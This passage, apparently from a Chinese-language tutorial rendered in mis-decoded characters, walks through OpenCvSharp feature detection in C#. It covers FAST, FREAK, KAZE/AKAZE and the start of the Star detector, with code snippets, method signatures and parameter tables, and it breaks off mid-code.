<p>FASTï¼ˆFeatures from Accelerated Segment Testï¼‰æ˜¯ä¸€ç§é«˜æ•ˆçš„ç‰¹å¾ç‚¹æ£€æµ‹ç®—æ³•ï¼Œå®ƒé€šè¿‡æ¯”è¾ƒå€™é€‰åƒç´ ç‚¹å‘¨å›´åœ†å½¢åŒºåŸŸä¸Šè¿ç»­åƒç´ çš„å¼ºåº¦å·®å¼‚æ¥è¯†åˆ«è§’ç‚¹ç‰¹å¾ã€‚è¯¥ç®—æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå¦‚æœæŸä¸ªåƒç´ ç‚¹å‘¨å›´æœ‰è¶³å¤Ÿå¤šçš„è¿ç»­åƒç´ æ¯”è¯¥ç‚¹äº®æˆ–æš—è¶³å¤Ÿå¤§çš„é˜ˆå€¼ï¼Œåˆ™è®¤ä¸ºè¯¥ç‚¹æ˜¯ä¸€ä¸ªç‰¹å¾ç‚¹ã€‚FASTç®—æ³•ä»¥å…¶è®¡ç®—é€Ÿåº¦å¿«ã€å®ç°ç®€å•è€Œè‘—ç§°ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦å®æ—¶å¤„ç†çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚è§†é¢‘è·Ÿè¸ªã€SLAMï¼ˆåŒæ­¥å®šä½ä¸åœ°å›¾æ„å»ºï¼‰å’Œå¢å¼ºç°å®ç­‰ã€‚ç›¸æ¯”SIFTã€SURFç­‰å¤æ‚ç‰¹å¾æ£€æµ‹ç®—æ³•ï¼ŒFASTåœ¨ä¿æŒè¾ƒå¥½æ£€æµ‹æ•ˆæœçš„åŒæ—¶ï¼Œå¤§å¹…æå‡äº†å¤„ç†é€Ÿåº¦ï¼Œä½¿å…¶æˆä¸ºè®¡ç®—æœºè§†è§‰é¢†åŸŸä¸­å¹¿æ³›ä½¿ç”¨çš„åŸºç¡€ç‰¹å¾æ£€æµ‹æ–¹æ³•ä¹‹ä¸€ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"> // è¯»å–å›¾åƒ
 using Mat <span class="hljs-attr">imgSrc</span> = new Mat(ImagePath, ImreadModes.Color)<span class="hljs-comment">;</span>
 using Mat <span class="hljs-attr">imgGray</span> = new Mat()<span class="hljs-comment">;</span>
 using Mat <span class="hljs-attr">imgDst</span> = imgSrc.Clone()<span class="hljs-comment">;</span>
 
 // è½¬æ¢ä¸ºç°åº¦å›¾åƒ
 Cv2.CvtColor(imgSrc, imgGray, ColorConversionCodes.BGR2GRAY, 0)<span class="hljs-comment">;</span>

 // ä½¿ç”¨FASTç®—æ³•æ£€æµ‹ç‰¹å¾ç‚¹
 // å‚æ•°è¯´æ˜ï¼šè¾“å…¥å›¾åƒã€é˜ˆå€¼ã€æ˜¯å¦å¯ç”¨éæå¤§å€¼æŠ‘åˆ¶
 KeyPoint<span class="hljs-section">[]</span> <span class="hljs-attr">keypoints</span> = Cv2.FAST(imgGray, <span class="hljs-number">50</span>, <span class="hljs-literal">true</span>)<span class="hljs-comment">;</span>

 // åœ¨å›¾åƒä¸Šç»˜åˆ¶æ£€æµ‹åˆ°çš„ç‰¹å¾ç‚¹
 foreach (KeyPoint kp in keypoints)
 {
     imgDst.Circle((Point)kp.Pt, 3, Scalar.Red, -1, LineTypes.AntiAlias, 0)<span class="hljs-comment">;</span>
 }
</code></pre>
<p>å…¶è¿‡ç¨‹å°±æ˜¯è¯»å–å›¾åƒã€å›¾åƒç°åº¦åŒ–ã€FASTç‰¹å¾æ£€æµ‹ä¸ç»˜åˆ¶ç‰¹å¾ç‚¹ã€‚</p>
<p>ç°åœ¨æ¥çœ‹ä¸‹FASTæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> KeyPoint[] <span class="hljs-built_in">FAST</span>(InputArray image, <span class="hljs-type">int</span> threshold, <span class="hljs-type">bool</span> nonmaxSupression = <span class="hljs-literal">true</span>)
{
    <span class="hljs-keyword">if</span> (image == null)
    {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArgumentNullException</span>(<span class="hljs-string">"image"</span>);
    }

    image.<span class="hljs-built_in">ThrowIfDisposed</span>();
    <span class="hljs-keyword">using</span> VectorOfKeyPoint vectorOfKeyPoint = <span class="hljs-keyword">new</span> <span class="hljs-built_in">VectorOfKeyPoint</span>();
    NativeMethods.<span class="hljs-built_in">HandleException</span>(NativeMethods.<span class="hljs-built_in">features2d_FAST1</span>(image.CvPtr, vectorOfKeyPoint.CvPtr, threshold, nonmaxSupression ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>));
    GC.<span class="hljs-built_in">KeepAlive</span>(image);
    <span class="hljs-keyword">return</span> vectorOfKeyPoint.<span class="hljs-built_in">ToArray</span>();
}
</code></pre>
<p>è¿™æ˜¯OpenCvSharpåº“ä¸­FASTç‰¹å¾æ£€æµ‹ç®—æ³•çš„æ ¸å¿ƒå®ç°å‡½æ•°ï¼Œç”¨äºåœ¨ç°åº¦å›¾åƒä¸­å¿«é€Ÿæ£€æµ‹è§’ç‚¹ç‰¹å¾ã€‚</p>

































<table><thead><tr><th>å‚æ•°å</th><th>ç±»å‹</th><th>å«ä¹‰</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>image</td><td>InputArray</td><td>è¾“å…¥çš„ç°åº¦å›¾åƒ</td><td>æ— </td><td>å¿…é¡»æ˜¯ç°åº¦å›¾åƒï¼Œç”¨äºæ£€æµ‹è§’ç‚¹ç‰¹å¾</td></tr><tr><td>threshold</td><td>int</td><td>å¼ºåº¦å·®å¼‚é˜ˆå€¼</td><td>æ— </td><td>ä¸­å¿ƒåƒç´ ä¸å‘¨å›´åœ†å½¢åŒºåŸŸåƒç´ çš„å¼ºåº¦å·®å¼‚é˜ˆå€¼ï¼Œå€¼è¶Šå¤§æ£€æµ‹åˆ°çš„ç‰¹å¾ç‚¹è¶Šå°‘ä½†æ›´ç¨³å®š</td></tr><tr><td>nonmaxSupression</td><td>bool</td><td>éæå¤§å€¼æŠ‘åˆ¶</td><td>true</td><td>æ˜¯å¦å¯¹æ£€æµ‹åˆ°çš„è§’ç‚¹åº”ç”¨éæå¤§å€¼æŠ‘åˆ¶ï¼Œå¯ç”¨åä¼šæ¶ˆé™¤é‡å¤æˆ–ç›¸è¿‘çš„è§’ç‚¹</td></tr></tbody></table>
<p>è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ç»„ç‰¹å¾ç‚¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3553827d6ecb43ff8ea60fc23d2ae343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=6EzTbFIKQ3X2aOO5sTfVrH3c%2B1I%3D" alt="" loading="lazy"/></p>
<p>ç»˜åˆ¶å‡ºæ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/681e1e2241464e2fb3be5642cc208af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=2jjHgV3dAtg%2FQeAqF4HeFOV4vK8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">FREAKç‰¹å¾æ£€æµ‹</h2>
<p>FREAKï¼ˆFast Retina Keypointï¼‰æ˜¯ä¸€ç§å—äººç±»è§†ç½‘è†œè§†è§‰ç³»ç»Ÿå¯å‘çš„å¿«é€ŸäºŒè¿›åˆ¶ç‰¹å¾æè¿°ç¬¦ï¼Œå®ƒé€šè¿‡æ¨¡ä»¿è§†ç½‘è†œç¥ç»ç»†èƒçš„å¯†é›†ä¸­å¿ƒ-ç¨€ç–å‘¨å›´çš„é‡‡æ ·æ¨¡å¼æ¥æå–å›¾åƒå±€éƒ¨ç‰¹å¾ã€‚è¯¥ç®—æ³•é¦–å…ˆä½¿ç”¨å…¶ä»–å…³é”®ç‚¹æ£€æµ‹å™¨ï¼ˆå¦‚ORBã€FASTç­‰ï¼‰å®šä½å›¾åƒä¸­çš„æ˜¾è‘—ç‚¹ï¼Œç„¶ååœ¨è¿™äº›ç‚¹å‘¨å›´æ„å»ºä¸€ä¸ªç±»ä¼¼è§†ç½‘è†œç»“æ„çš„é‡‡æ ·æ¨¡å¼ï¼Œé€šè¿‡æ¯”è¾ƒä¸åŒé‡‡æ ·åŒºåŸŸé—´çš„åƒç´ å¼ºåº¦å¯¹æ¥ç”Ÿæˆç´§å‡‘çš„äºŒè¿›åˆ¶æè¿°ç¬¦ã€‚FREAKæè¿°ç¬¦å…·æœ‰è®¡ç®—æ•ˆç‡é«˜ã€å†…å­˜å ç”¨å°ã€åŒ¹é…é€Ÿåº¦å¿«çš„ç‰¹ç‚¹ï¼ŒåŒæ—¶å¯¹æ—‹è½¬ã€å°ºåº¦å˜åŒ–å’Œå…‰ç…§å˜åŒ–å…·æœ‰è‰¯å¥½çš„é²æ£’æ€§ï¼Œä½¿å…¶å¹¿æ³›åº”ç”¨äºå®æ—¶å›¾åƒåŒ¹é…ã€ç‰©ä½“è¯†åˆ«ã€è§†è§‰SLAMå’Œå¢å¼ºç°å®ç­‰è®¡ç®—æœºè§†è§‰ä»»åŠ¡ä¸­ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">  <span class="hljs-comment">// è¯»å–å›¾åƒ</span>
  using <span class="hljs-selector-tag">var</span> gray = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Grayscale);
  using <span class="hljs-selector-tag">var</span> dst = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Color);

  <span class="hljs-comment">// ORBæ£€æµ‹å…³é”®ç‚¹</span>
  using <span class="hljs-selector-tag">var</span> orb = ORB<span class="hljs-selector-class">.Create</span>(<span class="hljs-number">1000</span>);
  KeyPoint<span class="hljs-selector-attr">[]</span> keypoints = orb<span class="hljs-selector-class">.Detect</span>(gray);

  <span class="hljs-comment">// FREAKè®¡ç®—æè¿°ç¬¦</span>
  using <span class="hljs-selector-tag">var</span> freak = FREAK<span class="hljs-selector-class">.Create</span>();
  Mat freakDescriptors = new <span class="hljs-built_in">Mat</span>();
  freak<span class="hljs-selector-class">.Compute</span>(gray, ref keypoints, freakDescriptors);

  <span class="hljs-comment">// åœ¨å›¾åƒä¸Šç»˜åˆ¶æ£€æµ‹åˆ°çš„ç‰¹å¾ç‚¹</span>
  if (keypoints != null)
  {
      <span class="hljs-selector-tag">var</span> <span class="hljs-attribute">color</span> = new <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>);
      foreach (KeyPoint kpt in keypoints)
      {
          <span class="hljs-attribute">float</span> r = kpt<span class="hljs-selector-class">.Size</span> / <span class="hljs-number">2</span>;
          Cv2<span class="hljs-selector-class">.Circle</span>(dst, (Point)kpt<span class="hljs-selector-class">.Pt</span>, (int)r, <span class="hljs-attribute">color</span>);
          Cv2<span class="hljs-selector-class">.Line</span>(dst,
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y + r),
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y - r),
              <span class="hljs-attribute">color</span>);
          Cv2<span class="hljs-selector-class">.Line</span>(dst,
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X - r, kpt.Pt.Y + r),
              (Point)new <span class="hljs-built_in">Point2f</span>(kpt.Pt.X + r, kpt.Pt.Y - r),
              <span class="hljs-attribute">color</span>);
      }
  }
</code></pre>
<p>å…ˆç”¨ORBæ£€æµ‹å…³é”®ç‚¹ï¼Œç„¶åå†ç”¨FREAKç‰¹å¾æ£€æµ‹ã€‚</p>
<p>æ¥çœ‹ä¸‹FREAK.Createæ–¹æ³•çš„ç­¾åï¼š</p>
<pre><code class="hljs language-ini" lang="ini"> public static FREAK Create(
     bool <span class="hljs-attr">orientationNormalized</span> = <span class="hljs-literal">true</span>,
     bool <span class="hljs-attr">scaleNormalized</span> = <span class="hljs-literal">true</span>,
     float <span class="hljs-attr">patternScale</span> = <span class="hljs-number">22.0</span>f,
     int <span class="hljs-attr">nOctaves</span> = <span class="hljs-number">4</span>,
     IEnumerable&lt;int&gt;? <span class="hljs-attr">selectedPairs</span> = null)
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æ˜¯OpenCVä¸­FREAKç‰¹å¾æè¿°ç¬¦çš„å·¥å‚æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºå’Œé…ç½®FREAKæè¿°ç¬¦å®ä¾‹ã€‚</p>
<p>æŸ¥çœ‹å‚æ•°å«ä¹‰ï¼š</p>









































<table><thead><tr><th>å‚æ•°å</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>å«ä¹‰è¯´æ˜</th></tr></thead><tbody><tr><td>orientationNormalized</td><td>bool</td><td>true</td><td>å¯ç”¨æ–¹å‘å½’ä¸€åŒ–ï¼Œä½¿æè¿°ç¬¦å¯¹å›¾åƒæ—‹è½¬å…·æœ‰ä¸å˜æ€§</td></tr><tr><td>scaleNormalized</td><td>bool</td><td>true</td><td>å¯ç”¨å°ºåº¦å½’ä¸€åŒ–ï¼Œä½¿æè¿°ç¬¦å¯¹å›¾åƒç¼©æ”¾å…·æœ‰ä¸å˜æ€§</td></tr><tr><td>patternScale</td><td>float</td><td>22.0f</td><td>æè¿°ç¬¦æ¨¡å¼çš„ç¼©æ”¾å› å­ï¼Œæ§åˆ¶é‡‡æ ·æ¨¡å¼çš„æ•´ä½“å¤§å°</td></tr><tr><td>nOctaves</td><td>int</td><td>4</td><td>æ£€æµ‹å…³é”®ç‚¹è¦†ç›–çš„å…«åº¦ç»„æ•°é‡ï¼Œå†³å®šå°ºåº¦èŒƒå›´</td></tr><tr><td>selectedPairs</td><td>IEnumerable?</td><td>null</td><td>ç”¨æˆ·è‡ªå®šä¹‰çš„é‡‡æ ·å¯¹é›†åˆï¼Œå¯ä¼˜åŒ–æ€§èƒ½æˆ–é€‚åº”ç‰¹å®šåœºæ™¯</td></tr></tbody></table>
<p>å†æ¥çœ‹ä¸‹Computeæ–¹æ³•çš„ç­¾åï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Compute</span><span class="hljs-params">(InputArray image, ref KeyPoint[] keypoints, OutputArray descriptors)</span>
</span></code></pre>
<p>è¯¥å‡½æ•°æ¥æ”¶è¾“å…¥å›¾åƒå’Œå…³é”®ç‚¹æ•°ç»„ï¼Œä¸ºæ¯ä¸ªå…³é”®ç‚¹è®¡ç®—å¯¹åº”çš„ç‰¹å¾æè¿°ç¬¦ï¼Œå¹¶è¿”å›æè¿°ç¬¦çŸ©é˜µã€‚</p>
<p>æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7c3f3f748454b7d96200ce3f9356a62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=IUXqBpgbMhxAiLvMfb7aBRLyqhQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">KAZE/AKAZEç‰¹å¾æ£€æµ‹</h2>
<p>KAZEå’ŒAKAZEæ˜¯ä¸¤ç§å…ˆè¿›çš„å›¾åƒç‰¹å¾æ£€æµ‹ç®—æ³•ï¼Œç”¨äºè¯†åˆ«å›¾åƒä¸­çš„å…³é”®ç‚¹å¹¶æå–å…¶æè¿°ç¬¦ã€‚KAZEï¼ˆKeyframes of Accelerated Speeded-up Robust Featuresï¼‰é‡‡ç”¨éçº¿æ€§å°ºåº¦ç©ºé—´æ„å»ºæ–¹æ³•ï¼Œé€šè¿‡éçº¿æ€§æ‰©æ•£æ»¤æ³¢æ¥æ£€æµ‹ç‰¹å¾ç‚¹ï¼Œå¯¹å›¾åƒæ¨¡ç³Šå’Œå™ªå£°å…·æœ‰å‡ºè‰²çš„é²æ£’æ€§ã€‚AKAZEï¼ˆAccelerated-KAZEï¼‰æ˜¯KAZEçš„ä¼˜åŒ–ç‰ˆæœ¬ï¼Œä½¿ç”¨å¿«é€Ÿæ˜¾å¼æ‰©æ•£ï¼ˆFEDï¼‰ç®—æ³•æ˜¾è‘—æé«˜äº†è®¡ç®—é€Ÿåº¦ï¼ŒåŒæ—¶ä¿æŒäº†ç‰¹å¾æ£€æµ‹çš„è´¨é‡ã€‚è¿™ä¸¤ç§ç®—æ³•éƒ½èƒ½åœ¨æ—‹è½¬ã€ç¼©æ”¾å’Œäº®åº¦å˜åŒ–ç­‰æ¡ä»¶ä¸‹ç¨³å®šåœ°æ£€æµ‹ç‰¹å¾ç‚¹ï¼Œå¹¿æ³›åº”ç”¨äºå›¾åƒåŒ¹é…ã€ç‰©ä½“è¯†åˆ«ã€ä¸‰ç»´é‡å»ºå’Œå¢å¼ºç°å®ç­‰è®¡ç®—æœºè§†è§‰ä»»åŠ¡ä¸­ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"> // åˆ›å»ºKAZEå’ŒAKAZEç‰¹å¾æ£€æµ‹å™¨
using var <span class="hljs-attr">kaze</span> = KAZE.Create()<span class="hljs-comment">;</span>
using var <span class="hljs-attr">akaze</span> = AKAZE.Create()<span class="hljs-comment">;</span>

var <span class="hljs-attr">kazeDescriptors</span> = new Mat()<span class="hljs-comment">;</span>
var <span class="hljs-attr">akazeDescriptors</span> = new Mat()<span class="hljs-comment">;</span>
KeyPoint<span class="hljs-section">[]</span> <span class="hljs-attr">kazeKeyPoints</span> = null, akazeKeyPoints = null<span class="hljs-comment">;</span>

// æµ‹é‡KAZEå¤„ç†æ—¶é—´
var <span class="hljs-attr">kazeTime</span> = MeasureTime(() =&gt;
   kaze.DetectAndCompute(gray, null, out kazeKeyPoints, kazeDescriptors))<span class="hljs-comment">;</span>

// æµ‹é‡AKAZEå¤„ç†æ—¶é—´
var <span class="hljs-attr">akazeTime</span> = MeasureTime(() =&gt;
   akaze.DetectAndCompute(gray, null, out akazeKeyPoints, akazeDescriptors))<span class="hljs-comment">;</span>

// åˆ›å»ºç»“æœå›¾åƒ
var <span class="hljs-attr">dstKaze</span> = new Mat()<span class="hljs-comment">;</span>
var <span class="hljs-attr">dstAkaze</span> = new Mat()<span class="hljs-comment">;</span>

// è¯»å–å½©è‰²å›¾åƒç”¨äºç»˜åˆ¶ç‰¹å¾ç‚¹
using var <span class="hljs-attr">colorImage</span> = new Mat(ImagePath, ImreadModes.Color)<span class="hljs-comment">;</span>

// ç»˜åˆ¶KAZEç‰¹å¾ç‚¹
Cv2.DrawKeypoints(colorImage, kazeKeyPoints, dstKaze)<span class="hljs-comment">;</span>

// ç»˜åˆ¶AKAZEç‰¹å¾ç‚¹
Cv2.DrawKeypoints(colorImage, akazeKeyPoints, dstAkaze)
</code></pre>
<p>æŸ¥çœ‹KAZE.Createå‡½æ•°ç­¾åï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> KAZE <span class="hljs-title">Create</span><span class="hljs-params">(
   <span class="hljs-type">bool</span> extended = <span class="hljs-literal">false</span>, <span class="hljs-type">bool</span> upright = <span class="hljs-literal">false</span>, <span class="hljs-type">float</span> threshold = <span class="hljs-number">0.001f</span>,
   <span class="hljs-type">int</span> nOctaves = <span class="hljs-number">4</span>, <span class="hljs-type">int</span> nOctaveLayers = <span class="hljs-number">4</span>, KAZEDiffusivityType diffusivity = KAZEDiffusivityType.DiffPmG2)</span>
</span></code></pre>
<p>è¿™æ˜¯OpenCVä¸­KAZEç‰¹å¾æ£€æµ‹å™¨çš„å·¥å‚æ–¹æ³•å®ç°ï¼Œç”¨äºåˆ›å»ºå’Œé…ç½®KAZEç®—æ³•å®ä¾‹ã€‚</p>








































<table><thead><tr><th>å‚æ•°å</th><th>å‚æ•°å«ä¹‰</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td>extended</td><td>æ˜¯å¦å¯ç”¨æ‰©å±•æè¿°ç¬¦ï¼ˆ128å­—èŠ‚ï¼‰</td><td>false</td></tr><tr><td>upright</td><td>æ˜¯å¦ä½¿ç”¨ç›´ç«‹æè¿°ç¬¦ï¼ˆéæ—‹è½¬ä¸å˜ï¼‰</td><td>false</td></tr><tr><td>threshold</td><td>æ£€æµ‹å™¨å“åº”é˜ˆå€¼</td><td>0.001f</td></tr><tr><td>nOctaves</td><td>å›¾åƒæœ€å¤§é‡‘å­—å¡”å±‚æ•°</td><td>4</td></tr><tr><td>nOctaveLayers</td><td>æ¯ä¸ªå°ºåº¦å±‚çš„å­çº§åˆ«æ•°é‡</td><td>4</td></tr><tr><td>diffusivity</td><td>æ‰©æ•£ç±»å‹ï¼ˆDIFF_PM_G1, DIFF_PM_G2, DIFF_WEICKERT, DIFF_CHARBONNIERï¼‰</td><td>KAZEDiffusivityType.DiffPmG2</td></tr></tbody></table>
<p>æŸ¥çœ‹AKAZE.Createå‡½æ•°ç­¾åï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AKAZE <span class="hljs-title function_">Create</span><span class="hljs-params">(AKAZEDescriptorType descriptorType = AKAZEDescriptorType.MLDB, <span class="hljs-type">int</span> descriptorSize = <span class="hljs-number">0</span>, <span class="hljs-type">int</span> descriptorChannels = <span class="hljs-number">3</span>, <span class="hljs-type">float</span> threshold = <span class="hljs-number">0.001f</span>, <span class="hljs-type">int</span> nOctaves = <span class="hljs-number">4</span>, <span class="hljs-type">int</span> nOctaveLayers = <span class="hljs-number">4</span>, KAZEDiffusivityType diffusivity = KAZEDiffusivityType.DiffPmG2)</span>
</code></pre>
<p>è¿™æ˜¯OpenCVä¸­AKAZEç‰¹å¾æ£€æµ‹å™¨çš„å·¥å‚æ–¹æ³•å®ç°ï¼Œç”¨äºåˆ›å»ºå’Œé…ç½®AKAZEç®—æ³•å®ä¾‹ã€‚AKAZEï¼ˆAccelerated-KAZEï¼‰æ˜¯KAZEç®—æ³•çš„åŠ é€Ÿç‰ˆæœ¬ï¼Œé€šè¿‡å¿«é€Ÿæ˜¾å¼æ‰©æ•£ï¼ˆFEDï¼‰ç®—æ³•æé«˜äº†è®¡ç®—é€Ÿåº¦ã€‚</p>





































<table><thead><tr><th>å‚æ•°å</th><th>å‚æ•°å«ä¹‰</th></tr></thead><tbody><tr><td>descriptorType</td><td>æè¿°ç¬¦ç±»å‹ï¼ˆDESCRIPTOR_KAZE, DESCRIPTOR_KAZE_UPRIGHT, DESCRIPTOR_MLDB, DESCRIPTOR_MLDB_UPRIGHTï¼‰</td></tr><tr><td>descriptorSize</td><td>æè¿°ç¬¦çš„ä½æ•°ï¼ˆ0è¡¨ç¤ºå®Œæ•´å¤§å°ï¼‰</td></tr><tr><td>descriptorChannels</td><td>æè¿°ç¬¦ä¸­çš„é€šé“æ•°ï¼ˆ1, 2, 3ï¼‰</td></tr><tr><td>threshold</td><td>æ£€æµ‹å™¨å“åº”é˜ˆå€¼</td></tr><tr><td>nOctaves</td><td>å›¾åƒæœ€å¤§é‡‘å­—å¡”å±‚æ•°</td></tr><tr><td>nOctaveLayers</td><td>æ¯ä¸ªå°ºåº¦å±‚çš„å­çº§åˆ«æ•°é‡</td></tr><tr><td>diffusivity</td><td>æ‰©æ•£ç±»å‹ï¼ˆDIFF_PM_G1, DIFF_PM_G2, DIFF_WEICKERT, DIFF_CHARBONNIERï¼‰</td></tr></tbody></table>
<p>æŸ¥çœ‹DrawKeypointså‡½æ•°ç­¾åï¼š</p>
<pre><code class="hljs language-java" lang="java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">DrawKeypoints</span><span class="hljs-params">(
   InputArray image,
   IEnumerable&lt;KeyPoint&gt; keypoints, 
   InputOutputArray outImage,
   Scalar? color = <span class="hljs-literal">null</span>,
   DrawMatchesFlags flags = DrawMatchesFlags.Default)</span>
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æ˜¯OpenCVä¸­ç”¨äºåœ¨å›¾åƒä¸Šç»˜åˆ¶ç‰¹å¾ç‚¹çš„é™æ€æ–¹æ³•ã€‚å®ƒæ¥å—æºå›¾åƒå’Œæ£€æµ‹åˆ°çš„å…³é”®ç‚¹åˆ—è¡¨ï¼Œç„¶ååœ¨è¾“å‡ºå›¾åƒä¸Šå¯è§†åŒ–è¿™äº›ç‰¹å¾ç‚¹ã€‚</p>





























<table><thead><tr><th>å‚æ•°å</th><th>å‚æ•°å«ä¹‰</th></tr></thead><tbody><tr><td>image</td><td>æºå›¾åƒ</td></tr><tr><td>keypoints</td><td>ä»æºå›¾åƒä¸­æ£€æµ‹åˆ°çš„å…³é”®ç‚¹é›†åˆ</td></tr><tr><td>outImage</td><td>è¾“å‡ºå›¾åƒï¼Œå…¶å†…å®¹å–å†³äºflagså‚æ•°å®šä¹‰çš„ç»˜åˆ¶æ–¹å¼</td></tr><tr><td>color</td><td>ç‰¹å¾ç‚¹çš„é¢œè‰²ï¼Œé»˜è®¤ä¸ºnullè¡¨ç¤ºä½¿ç”¨éšæœºé¢œè‰²</td></tr><tr><td>flags</td><td>ç»˜åˆ¶ç‰¹å¾çš„æ ‡å¿—ï¼Œç”±DrawMatchesFlagsæšä¸¾å®šä¹‰ï¼Œæ§åˆ¶ç‰¹å¾ç‚¹çš„ç»˜åˆ¶æ ·å¼</td></tr></tbody></table>
<p>æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d019091fe63f4856843605b07f0ffe9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472678&amp;x-signature=MdifgijvO0Qpx2fzxe5%2B%2Bma4VGw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">Starç‰¹å¾æ£€æµ‹</h2>
<p>Starç‰¹å¾æ£€æµ‹æ˜¯ä¸€ç§åŸºäºå›¾åƒå¼ºåº¦çš„ç‰¹å¾ç‚¹æ£€æµ‹ç®—æ³•ï¼Œå®ƒé€šè¿‡åœ¨ä¸åŒå°ºåº¦ä¸Šå¯»æ‰¾å›¾åƒä¸­çš„"æ˜Ÿå½¢"ç»“æ„æ¥è¯†åˆ«å…³é”®ç‚¹ã€‚è¯¥ç®—æ³•ä½¿ç”¨å¤šå°ºåº¦åˆ†ææŠ€æœ¯ï¼Œèƒ½å¤Ÿæ£€æµ‹ä¸åŒå¤§å°çš„ç‰¹å¾ç‚¹ï¼Œå¯¹å›¾åƒä¸­çš„è§’ç‚¹å’Œæ–‘ç‚¹éƒ½å¾ˆæ•æ„Ÿã€‚Staræ£€æµ‹å™¨çš„å·¥ä½œåŸç†æ˜¯é¦–å…ˆå°†å›¾åƒè½¬æ¢ä¸ºç°åº¦å›¾ï¼Œç„¶åé€šè¿‡è®¡ç®—æ¯ä¸ªåƒç´ ç‚¹åœ¨ä¸åŒå°ºåº¦ä¸‹çš„å“åº”å€¼æ¥è¯†åˆ«å…·æœ‰æ˜¾è‘—ç‰¹å¾çš„ç‚¹ï¼Œæœ€ååº”ç”¨éæå¤§å€¼æŠ‘åˆ¶æ¥ç­›é€‰å‡ºæœ€ä¼˜çš„ç‰¹å¾ç‚¹ã€‚è¿™ç§æ£€æµ‹å™¨ç‰¹åˆ«é€‚ç”¨äºå›¾åƒé…å‡†ã€ç‰©ä½“è¯†åˆ«ã€ä¸‰ç»´é‡å»ºå’Œå›¾åƒæ‹¼æ¥ç­‰è®¡ç®—æœºè§†è§‰åº”ç”¨ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿæä¾›ç¨³å®šä¸”å¯é‡å¤çš„ç‰¹å¾ç‚¹ï¼Œå³ä½¿åœ¨å›¾åƒå‘ç”Ÿå°ºåº¦å˜åŒ–æˆ–è½»å¾®æ—‹è½¬æ—¶ä¹Ÿèƒ½ä¿æŒè¾ƒå¥½çš„æ£€æµ‹æ•ˆæœã€‚</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">// è¯»å–å›¾åƒ</span>
using Mat imgSrc = new <span class="hljs-built_in">Mat</span>(ImagePath, ImreadModes.Color);
using Mat imgGray = new <span class="hljs-built_in">Mat</span>();
using Mat imgDst = imgSrc<span class="hljs-selector-class">.Clone</span>();

<span class="hljs-comment">// è½¬æ¢ä¸ºç°åº¦å›¾åƒ</span>
Cv2<span class="hljs-selector-class">.CvtColor</span>(imgSrc, imgGray, ColorConversionCodes.BGR2GRAY, <span class="hljs-number">0</span>);

<span class="hljs-comment">// ä½¿ç”¨StarDetectorç®—æ³•æ£€æµ‹ç‰¹å¾ç‚¹</span>
StarDetector detector = StarDetector<span class="hljs-selector-class">.Create</span>(MaxSize, ResponseThreshold, LineThresholdProjected, 
                                        LineThresholdBinarized, SuppressNonmaxSize);
